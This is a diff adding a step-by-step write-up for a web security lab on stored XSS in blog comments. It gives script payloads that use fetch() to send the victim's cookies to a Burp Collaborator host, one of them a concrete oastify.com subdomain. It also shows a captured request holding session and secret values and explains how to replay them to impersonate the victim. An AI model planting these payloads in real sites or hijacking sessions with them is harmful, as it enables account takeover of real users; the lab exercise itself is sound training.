@@ -1,0 +1,54 @@
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim
+
+
+Step-1:
+
+Using Burp Suite Professional, go to the Collaborator tab.
+
+Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard
+
+make this payloads
+
+This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server
+
+
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+
+or
+
+<script>
+fetch('https://rd8sr31tw26lvpzo1ln8oj5r9if93zro.oastify.com?cookie='+document.cookie);
+</script>
+
+step-2:
+Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again
+
+step-3:
+
+we will see the cookie session and secret in the HTTP interaction and then go to the Request collaborator
+
+
+GET /?cookie=secret=lIWwIyJaHDik11PlPo9kmRu4y6WLYOge;%20session=iUgkypp4aThYZrLgC3B1hz9EuD8d1eZ4 HTTP/1.1
+
+step-4:
+
+now go to the website in the inspect than storage or application  option we will see the cookie info and now we will change those info session value and also make another secret name change the value which we got from the collaborator
+
+
+step-5: 
+we will reload the website and lab solved
+
+
+
+
+
+
+
+
+
